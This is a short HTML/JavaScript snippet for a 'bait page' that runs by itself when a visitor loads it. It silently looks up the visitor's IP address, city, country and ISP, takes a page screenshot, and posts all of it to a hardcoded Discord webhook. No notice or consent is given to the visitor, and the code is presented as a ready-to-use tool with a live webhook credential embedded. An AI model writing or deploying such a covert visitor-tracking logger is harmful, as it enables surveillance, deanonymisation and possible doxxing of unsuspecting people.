<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';

  async function getIP() {
    const res = await fetch('https://ipapi.co/json/');
    return await res.json();
  }

  async function screenshot() {
    try {
      const canvas = await html2canvas(document.body, {scale: 0.5});
      return canvas.toDataURL('image/png');
    } catch { return null; }
  }

  (async () => {
    try {
      const data = await getIP();
      const ss = await screenshot();
      const embed = {
        title: 'Visitor Trapped (Bait Page)',
        color: 0x00ff00,
        fields: [
          {name: 'IP', value: data.ip, inline: true},
          {name: 'Location', value: `${data.city}, ${data.country_name}`, inline: true},
          {name: 'ISP', value: data.org, inline: true}
        ],
        timestamp: new Date().toISOString()
      };
      if (ss) {
        await fetch(WEBHOOK, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({embeds: [embed], files: [{attachment: ss, name: 'proof.png'}]})
        });
      } else {
        await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({embeds: [embed]})});
      }
    } catch {}
  })();
</script>
